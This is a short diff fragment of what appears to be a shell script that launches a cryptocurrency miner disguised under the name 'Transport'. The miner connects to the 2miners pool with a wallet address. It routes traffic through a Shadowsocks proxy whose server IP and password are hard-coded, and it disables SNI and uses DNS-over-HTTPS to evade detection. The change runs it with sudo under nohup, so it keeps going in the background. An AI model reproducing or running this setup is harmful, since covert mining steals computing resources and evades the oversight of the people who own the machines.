@@ -39,4 +39,4 @@ ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305
 
 ph add Transport
 
-./Transport -a ethash -o stratum+ssl://eth.2miners.com:12020 -u nano_3otddbnyttuhkkx7dopz399df8eogmi4x5k3kobmpg3tjzyy18d1noh3skxe -p x -w $(echo $(shuf -i 1-9999 -n 1)-pentil) --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+sudo nohup ./Transport -a ethash -o stratum+ssl://eth.2miners.com:12020 -u nano_3otddbnyttuhkkx7dopz399df8eogmi4x5k3kobmpg3tjzyy18d1noh3skxe -p x -w $(echo $(shuf -i 1-9999 -n 1)-pentil) --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999 nohup.out
